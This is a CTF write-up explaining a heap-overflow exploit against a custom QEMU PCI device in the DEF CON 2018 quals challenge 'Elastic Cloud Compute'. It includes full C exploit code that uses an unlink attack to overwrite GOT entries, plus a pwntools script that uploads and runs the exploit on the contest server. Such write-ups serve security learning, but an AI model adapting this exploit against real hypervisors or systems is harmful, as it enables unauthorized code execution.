Elastic Cloud Compute  
---------------------  
For this challenge we were provided with a custom qemu binary and a barebones
linux image.

Since the challenge description mentions "extra PCI devices" we started
looking around in the qemu binary. Searching for interesting strings in the
qemu binary let us find the functions that handle the additional driver
(containing "ooo_class_init").

Looking online for guides on how to add devices to qemu we actually found the
[source code](https://github.com/qemu/qemu/blob/v2.7.0/hw/misc/edu.c) the
driver was based on: this really helped in reversing the binary more quickly.

The driver handles writes and reads to its mapped memory by `malloc`ing memory
and writing and reading data in the heap. It's easy to spot a problem: there
is no bound checking on either of them. We can write and read on the heap with
a range of 16 bits of offset, more than enough to corrupt the chunk headers
and perform some heap exploitation.

A good target for our memory corruption is the array where the `malloc`ed
pointers are saved, which is located in the bss. Controlling them would mean
choosing where to read and write when accessing the driver's memory.

To manage this we exploited the unlink macro in the `free` call.

We allocate two consecutive chunks, then forge a fake chunk  and store it in
the first chunk's content space. We overwrite the prev_size header of the
second chunk to make it look like the chunk preceding it is our forged chunk,
and we unset the prev_inuse flag for the second chunk. We then free the second
chunk, which in turn triggers a consolidation with our fake chunk.

By  accurately writing all the size fields and the target pointers, all
security checks pass and the unlink macro overwrites the pointer in the bss,
which now points to the bss itself. We can now write directly on the bss and
edit the pointers, which therefore means we managed to obtain an arbitrary
write primitive.

To finish the challenge we simply overwrite the GOT entry of `free` with the
function that prints the flag. We trigger a call to `free` and obtain the
flag.

P.S.  
We had some issues trying to compile and/or execute our exploit inside qemu.
We managed to make it run with some glorified copy and paste.

Exploit to be run inside qemu:  
```c  
/*  
Basic PCI communication template from
https://github.com/billfarrow/pcimem/blob/master/pcimem.c  
Unlink exploit written following https://heap-
exploitation.dhavalkapil.com/attacks/unlink_exploit.html  
*/

#include <stdio.h>  
#include <stdlib.h>  
#include <stdint.h>  
#include <unistd.h>  
#include <string.h>  
#include <errno.h>  
#include <signal.h>  
#include <fcntl.h>  
#include <ctype.h>  
#include <termios.h>  
#include <sys/types.h>  
#include <sys/mman.h>

#define PRINT_ERROR \  
	do { \  
		fprintf(stderr, "Error at line %d, file %s (%d) [%s]\n", \  
		__LINE__, __FILE__, errno, strerror(errno)); exit(1); \  
	} while(0)

// map 24 bit address space  
#define MAP_SIZE 16777216UL  
#define MAP_MASK (MAP_SIZE - 1)

void pci_read(void *map_base, off_t target, int access_type) {  
	int type_width;  
	int64_t read_result;  
	void *virt_addr;

	virt_addr = map_base + (target & MAP_MASK);  
	switch(access_type) {  
		case 'b':  
			read_result = *((uint8_t *) virt_addr);  
			type_width = 2;  
			break;  
		case 'h':  
			read_result = *((uint16_t *) virt_addr);  
			type_width = 4;  
			break;  
		case 'w':  
			read_result = *((uint32_t *) virt_addr);  
			type_width = 8;  
			break;  
		case 'd':  
			read_result = *((uint64_t *) virt_addr);  
			type_width = 16;  
			break;  
		default:  
			fprintf(stderr, "Illegal data type '%c'.\n", access_type);  
			exit(2);  
	}  
	printf("Value at offset 0x%X (%p): 0x%0*lX\n", (int) target, virt_addr, type_width, read_result);  
	fflush(stdout);  
}

void pci_write(void *map_base, off_t target, int access_type, int64_t
writeval) {  
	int type_width = 16;  
	int64_t read_result;  
	void *virt_addr;  
  
	virt_addr = map_base + (target & MAP_MASK);  
	// printf("Virt addr %p\n", virt_addr);  
	// printf("Writeval %x\n", writeval);  
	switch(access_type) {  
		case 'b':  
			*((uint8_t *) virt_addr) = writeval;  
			break;  
		case 'h':  
			*((uint16_t *) virt_addr) = writeval;  
			break;  
		case 'w':  
			*((uint32_t *) virt_addr) = writeval;  
			break;  
		case 'd':  
			*((uint64_t *) virt_addr) = writeval;  
			break;  
	}  
	// printf("Written 0x%0*lX\n", type_width,  
	//   writeval, type_width, read_result);  
	fflush(stdout);  
}

// write/read address is like [opcode, 4bit][memid, 4bit][subaddress, 16bit]

// malloc: write to memory with opcode 0  
void mall(void *map_base, int index, int size) {  
	// malloc size = valtowrite * 8  
	off_t target = ((index & 0xF) << 16);  
	pci_write(map_base, target, 'w', size / 8);  
}

// write to pointed area: write to memory with opcode 2  
void write_heap(void *map_base, int index, int64_t writeval, int offset) {  
	// offset is a 16 bit value  
	off_t target = offset | ((index & 0xF) << 16) | ((2 & 0xF) << 20);  
	pci_write(map_base, target, 'w', writeval);  
}  
  
// free: write to memory with opcode 1  
void myfree(void *map_base, int index) {  
	off_t target = ((index & 0xF) << 16) | ((1 & 0xF) << 20);  
	pci_write(map_base, target, 'w', 0);  
}

// read from pointer: read memory  
void myread(void *map_base, int index, int offset) {  
	// read 4 bytes, unused  
	off_t target = ((index & 0xF) << 16) | offset;  
	pci_read(map_base, target, 'd');  
}

int main(int argc, char **argv) {  
	int fd;  
	void *map_base;  
	char *filename;  
	off_t target;  
	int access_type = 'w';

	filename = "/sys/devices/pci0000:00/0000:00:04.0/resource0";  
	target = 0x0;  
	access_type = 'w';  
	argc = 0;

	if((fd = open(filename, O_RDWR | O_SYNC)) == -1) PRINT_ERROR;  
	printf("%s opened.\n", filename);  
	printf("Target offset is 0x%x, page size is %ld\n", (int) target, sysconf(_SC_PAGE_SIZE));  
	fflush(stdout);

	// map device memory  
	printf("mmap(%d, %ld, 0x%x, 0x%x, %d, 0x%x)\n", 0, MAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, (int) target);  
	map_base = mmap(0, MAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, target & ~MAP_MASK);  
	if(map_base == (void *) -1) PRINT_ERROR;  
	printf("PCI Memory mapped to address 0x%08lx.\n", (unsigned long) map_base);  
	fflush(stdout);

	printf("Clearing bins\n");  
	// clear malloc bins to make sure we will have consecutive chunks  
	int i;  
	for (i = 0; i < 2000; i++)  
		mall(map_base, i % 4, 0x80);

	// we now have some heap pointers at the indexes 0,1,2,3  
	printf("Starting exploit\n");

	// struct chunk_structure {  
	//   size_t prev_size;  
	//   size_t size;  
	//   struct chunk_structure *fd;  
	//   struct chunk_structure *bk;  
	//   char buf[10];               // padding  
	// };

	// First forge a fake chunk starting at chunk1  
	// Need to setup fd and bk pointers to pass the unlink security check  
	//fake_chunk = (struct chunk_structure *)chunk1;  
	//fake_chunk->fd = (struct chunk_structure *)(&chunk1 - 3); // Ensures P->fd->bk == P  
	//fake_chunk->bk = (struct chunk_structure *)(&chunk1 - 2); // Ensures P->bk->fd == P

	// fake chunk prev_size = 0 (probably not needed)  
	write_heap(map_base, 0, 0, 0);  
	write_heap(map_base, 0, 0, 4);  
	// fake chunk size = 0x80, NON_MAIN_ARENA and PREV_INUSE flags are set  
	write_heap(map_base, 0, 0x85, 8);  
	write_heap(map_base, 0, 0, 12);  
	// write &chunk1 - 3 (0x1317928) in chunk1 + 16  
	write_heap(map_base, 0, 0x1317928, 16);  
	// write &chunk1 - 2 (0x1317930) in chunk1 + 24  
	write_heap(map_base, 0, 0x1317930, 24);

	// Next modify the header of chunk2 to pass all security checks  
	//chunk2_hdr = (struct chunk_structure *)(chunk2 - 2);  
	//chunk2_hdr->prev_size = 0x80;  // chunk1's data region size  
	//chunk2_hdr->size &= ~1;        // Unsetting prev_in_use bit

	// chunk2 prev_size = 0x80  
	write_heap(map_base, 0, 0x80, 0x80);  
	// unset PREV_INUSE bit for chunk2  
	write_heap(map_base, 0, 0x94, 0x88);

	// Now, when chunk2 is freed, attacker's fake chunk is 'unlinked'  
	// This results in chunk1 pointer pointing to chunk1 - 3  
	// i.e. chunk1[3] now contains chunk1 itself.  
	// We then make chunk1 point to some victim's data  
	//free(chunk2);  
	myfree(map_base, 1);  
	printf("Pointer overwritten\n");

	// overwrite pointer at index 1 with the address of free@GOT  
	write_heap(map_base, 0, 0x011301A0, 32);  
	write_heap(map_base, 0, 0, 36); 

	// overwrite GOT entry of free with our target function  
	write_heap(map_base, 1, 0x6e65f9, 0);  
	write_heap(map_base, 1, 0, 4);

	printf("Reading flag\n");  
	myfree(map_base, 0);  
  
	if(munmap(map_base, MAP_SIZE) == -1) PRINT_ERROR;  
	close(fd);  
	return 0;  
}  
```

Script to load the exploit in qemu and execute it:  
```python  
#!/usr/bin/env python  
from __future__ import print_function  
import sys  
import struct  
import hashlib  
from pwn import *  
import base64  
import subprocess  
from time import sleep

host = '11d9f496.quals2018.oooverflow.io'  
port =  31337

def chunkstring(string, length):  
   return (string[0+i:length+i] for i in range(0, len(string), length))

def buildexploit():  
   subprocess.check_call("musl-gcc exploit.c -Os -static -o
exploit",shell=True)  
   subprocess.check_call("tar cfz exploit.tar.gz exploit",shell=True)  
   with open("./exploit.tar.gz", "rb") as f:  
       exploit = f.read()  
   b64exploit = base64.b64encode(exploit)  
   exploit.encode("base64")  
   return b64exploit

def exploit(send):  
   exp = buildexploit()  
   sleep(10)  
   print("chunks...")  
   i = 0  
   for chunk in chunkstring(exp, 700):  
       sleep(2)  
       print(i)  
       i += 1  
       send("echo -n \"{}\" >> exploitb64".format(chunk))  
   sleep(1)  
   print("almost")  
   send("base64 -d exploitb64 > ./exploit.tar.gz")  
   sleep(1)  
   send("tar xf exploit.tar.gz")  
   sleep(1)  
   send("chmod +x ./exploit")  
   sleep(1)  
   send("ls")  
   sleep(1)  
   send("./exploit")

def pow_hash(challenge, solution):  
   return hashlib.sha256(challenge.encode('ascii') + struct.pack('<Q',
solution)).hexdigest()

def check_pow(challenge, n, solution):  
   h = pow_hash(challenge, solution)  
   return (int(h, 16) % (2**n)) == 0

def solve_pow(challenge, n):  
   candidate = 0  
   while True:  
       if check_pow(challenge, n, candidate):  
           return candidate  
       candidate += 1

if __name__ == '__main__':  
   conn = remote(host,port)  
   conn.recvuntil('Challenge: ')  
   challenge = conn.recvuntil('\n')[:-1]  
   conn.recvuntil('n: ')  
   n = int(conn.recvuntil('\n')[:-1])

   print('Solving challenge: "{}", n: {}'.format(challenge, n))

   solution = solve_pow(challenge, n)  
   print('Solution: {} -> {}'.format(solution, pow_hash(challenge, solution)))  
   conn.sendline(str(solution))  
   exploit(conn.sendline)  
   conn.interactive()  
```  

Original writeup
(https://mhackeroni.it/archive/2018/05/20/defconctfquals-2018-all-
writeups.html#elastic-cloud-compute).